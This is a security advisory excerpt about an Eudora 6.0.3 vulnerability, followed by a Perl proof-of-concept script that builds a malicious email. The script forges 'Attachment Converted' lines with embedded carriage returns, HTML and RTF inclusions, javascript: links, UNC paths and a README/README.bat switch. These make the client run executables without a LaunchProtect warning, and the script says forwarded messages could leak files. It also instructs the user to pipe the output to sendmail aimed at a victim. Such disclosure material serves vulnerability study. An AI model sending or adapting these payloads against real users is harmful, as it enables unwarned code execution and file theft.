source: http://www.securityfocus.com/bid/9026/info

A vulnerability has been reported by Qualcomm that may be exploited by a remote attacker to cause the Eudora e-mail client to crash. It has been reported that a malicious email that contains a spoofed attachment converted line will trigger this issue in a vulnerable release of Eudora when the malicious message is viewed. 

#!/usr/bin/perl --

use MIME::Base64;

print "From: me\n";
print "To: you\n";
print "Subject: Eudora 6.0.3 on Windows spoof, LaunchProtect\n";
print "MIME-Version: 1.0\n";
print "Content-Type: multipart/mixed; boundary=\"zzz\"\n";
print "\n";
print "This is a multi-part message in MIME format.\n";
print "--zzz\n";
print "Content-Type: text/plain\n";
print "Content-Transfer-Encoding: 7bit\n";
print "\n";

print "Pipe the output of this script into:   sendmail -i victim\n";

print "\nWith spoofed attachments, we could 'steal' files if the
message
was forwarded (not replied to).\n";

print "\nWithin plain-text email (or plain-text, inline MIME parts)
embedded
CR=x0d characters get converted internally into a NUL=x00 and ignored,
so we can spoof \"attachment converted\" lines:\n";

print "\nThe following work fine (but are boring and/or put up
warnings):\n";
print "Attachment Converted\r: \"c:\\winnt\\system32\\calc.exe\"\n";
print "Attachment Converted\r: c:\\winnt\\system32\\calc.exe\n";
print "(Note how JavaScript is done with IE, web with default browser
Netscape)\n";
print "Attachment Converted\r: <A
href=javascript:alert(%27hello%27)>hello.txt</a>\n";
print "Attachment Converted\r: <A
href=http://www.maths.usyd.edu.au:8000/u/psz/securepc.html#Eudoraxx>web.txt</a>\n";
print "Attachment Converted\r: <A
href=c:/winnt/system32/calc.exe>file.txt</a>\n";

print "\nIf we can guess the full path to the attach directory then can
change the name shown to anything we like, but get broken icon:\n";
print "Attachment Converted\r: <A
href=H:/eudora/attach/calc>file.txt</a>\n";

print "\nCuteness value only:\n";
print "Attachment Converted\r: <A
href=c:/winnt/system32/calc.exe>file1.txt</a> xyz <A href=c:/winnt/system32/calc.exe>file2.txt</a>\n";

print "\n<x-html>
With <b>HTML</b> <i>inclusions</i> we can do
<a href=c:/winnt/system32/calc.exe>file</a>,
<a
href=\"http://www.maths.usyd.edu.au:8000/u/psz/securepc.html#Eudoraxx\">http</a>
and
<a href=\"javascript:alert(\x27hello\x27)\">javascript</a>
references. Any way to exploit this?
</x-html>\n";

print "\n<x-rich>
Can also do RTF inclusions. Can this be abused?
</x-rich>\n";

print "\nThose <x-xyz></x-xyz> constructs allow spoofing
attachments easily, without embedded CR:\n\n";
print "HTML\n";
print "<x-html></x-html>Attachment Converted: \"xyz\"\n";
print "Rich\n";
print "<x-rich></x-rich>Attachment Converted: \"xyz\"\n";
print "Flowed\n";
print "<x-flowed></x-flowed>Attachment Converted: \"xyz\"\n";

print "\n";

print "\n--zzz\n";
print "Content-Type: text/plain; name=\"plain.txt\"\n";
print "Content-Transfer-Encoding: 7bit\n";
print "Content-Disposition: inline; filename=\"plain.txt\"\n";
print "\n";
print "Within a 'plain' attachment:\n";
print "Attachment Converted\r: \"c:\\winnt\\system32\\calc.exe\"\n";

print "\n--zzz\n";
print "Content-Type: text/plain; name=\"qp.txt\"\n";
print "Content-Transfer-Encoding: quoted-printable \n";
print "Content-Disposition: inline; filename=\"qp.txt\"\n";
print "\n";
print "Within quoted-printable encoded parts still need the embedded
CR:\n";
print "=41ttachment=20=43onverted\r=3a
\"c:\\winnt\\system32\\calc.exe\"\n";

print "\n--zzz\n";
print "Content-Type: text/plain; name=\"b64.txt\"\n";
print "Content-Transfer-Encoding: base64\n";
print "Content-Disposition: inline; filename=\"b64.txt\"\n";
print "\n";
$z = "Within base64 encoded (plain-text, inline) MIME parts, can
spoof\r
without embedded CR (but line termination is CR-NL):\r
Attachment Converted: \"c:\\winnt\\system32\\calc.exe\"\r\n";
print encode_base64($z);

print "\n--zzz\n";
print "Content-Type: text/plain\n";
print "Content-Transfer-Encoding: 7bit\n";
print "\n";

print "\n=====\n";

$X = 'README'; $Y = "$X.bat";
print "\nThe X - X.exe dichotomy: send a plain $X attachment:\n";
$z = "rem Funny joke\r\npause\r\n";
print "begin 600 $X\n", pack('u',$z), "`\nend\n";
print "\nand (in another message or) after some blurb so is scrolled
off in
another screenful, also send $Y. Clicking on $X does not
get it any more (but gets $Y, with a LauchProtect warning):\n";
$z = "rem Big joke\r\nrem Should do something nasty\r\npause\r\n";
print "begin 600 $Y\n", pack('u',$z), "`\nend\n";

print "\n=====\n";

print "
Eudora 6.0.3 LaunchProtect handles the X-X.exe dichotomy in the attach
directory only, and allows spoofed attachments pointing to an
executable
stored elsewhere to run without warning:\n";
print "Attachment Converted\r: <a
href=c:/winnt/system32/calc>go.txt</a>\n";
print "Attachment Converted\r: c:/winnt/system32/calc\n";

print "
Can be exploited if there is more than one way into attach: in my setup
H: and \\\\rome\\home are the same thing, but Eudora does not know
that.\n";
print "These elicit warnings:\n";
print "Attachment Converted\r: <a
href=h:/eudora/attach/README>readme.txt</a>\n";
print "Attachment Converted\r: h:/eudora/attach/README\n";
print "Attachment Converted\r: \\README\n";
print "Attachment Converted\r: .\\README\n";
print "Attachment Converted\r: \\.\\README\n";
print "Attachment Converted\r: ?\\README\n";
print "Attachment Converted\r: \\?\\README\n";
print "while these do the bad thing without warning:\n";
print "Attachment Converted\r: <a
href=file://rome/home/eudora/attach/README>readme</a>\n";
print "Attachment Converted\r: //rome/home/eudora/attach/README\n";
print "Attachment Converted\r:
\\\\rome\\home\\eudora\\attach\\README\n";

print "
For the default setup, Eudora knows that C:\\Program Files
and C:\\Progra~1 are the same thing:\n";
print "Attachment Converted\r: \"c:/program
files/qualcomm/eudora/attach/README\"\n";
print "Attachment Converted\r:
\"c:/progra~1/qualcomm/eudora/attach/README\"\n";
print "
and also knows that various UNC references:
\\\\localhost\\c...
\\\\127.0.0.1\\c...
\\\\BIOSNAME\\c...
\\\\DNSNAME\\c...
\\\\IP\\c...
\\\\\\?\\c...
\\\\c...
...c:\\progr...
...c\\progr...
...c:progr...
...program files\\...
...progra~1\\...
or even
.\\NoSuchDir\\..\\README
//c|\\Program Files\\qualcomm\\eudora\\attach\\README
\\\\c|\\Program Files\\qualcomm\\eudora\\attach\\README
res://c:\\Program Files\\qualcomm\\eudora\\attach\\README
res:\\\\c:\\Program Files\\qualcomm\\eudora\\attach\\README
shell:Fonts\\..\\..\\Program Files\\qualcomm\\eudora\\attach\\README
%ProgramFiles%\\qualcomm\\eudora\\attach\\README
%windir%\\..\\Program Files\\qualcomm\\eudora\\attach\\README
are all the same thing...
";

print "\n";
print "\n--zzz--\n";
print "\n";